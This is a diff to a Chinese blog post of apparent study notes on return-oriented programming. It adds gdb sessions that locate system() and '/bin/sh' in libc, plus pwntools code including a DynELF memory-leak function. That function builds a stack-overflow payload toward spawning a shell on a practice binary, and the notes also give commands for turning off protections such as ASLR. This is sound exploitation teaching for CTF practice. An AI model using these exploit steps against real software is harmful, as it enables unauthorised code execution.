@@ -21,6 +21,61 @@ excerpt: ROP的全称为Return-oriented programming(返回导向编程),这是�
 
 ### 无保护
 
-* 关掉canary:  **-fno-stack-protector** 
-* 关掉NX:  **-z execstack** 
-* 关掉PIE:  **sudo -s echo 0 > /proc/sys/kernel/randomize_va_space** 
+* 关掉canary:  **-fno-stack-protector**
+* 关掉NX:  **-z execstack**
+* 关掉PIE:  **sudo -s echo 0 > /proc/sys/kernel/randomize_va_space**
+
+### 绕过NX
+
+gdb下找`system()`和`"/bin/sh\x00"`的地址:
+
+```bash
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e5f460 <system>
+(gdb) print __libc_start_main
+$2 = {<text variable, no debug info>} 0xb7e393f0 <__libc_start_main>
+(gdb) find 0xb7e393f0, +2200000, "/bin/sh"
+0xb7f81ff8
+(gdb) x/s 0xb7f81ff8
+0xb7f81ff8:  "/bin/sh"
+```
+
+### 绕过NX和PIE
+
+* 看plt : **objdump -d -j .plt level2**
+* 看got : **objdump -R level2**
+* 查看目标程序调用的so库 : **ldd level2**
+
+用pwntools: 
+
+```python
+elf = ELF('level2')
+plt_write = elf.symbols['write']
+got_write = elf.got['write']
+
+libc = ELF('libc.so')
+system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
+```
+
+### 无libc.so
+
+步骤: 
+1. 泄露`__libc_start_main`地址
+2. 获取`libc`版本
+3. 获取`system`地址与`/bin/sh`的地址
+4. 再次执行源程序
+5. 触发栈溢出执行`system(“/bin/sh”)`
+
+DynELF的使用: 
+
+```python
+def leak(address):
+    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print "%#x => %s" % (address, (data or '').encode('hex'))
+    return data
+
+d = DynELF(leak, elf=ELF('./level2'))
+system_addr = d.lookup('system', 'libc')
+```
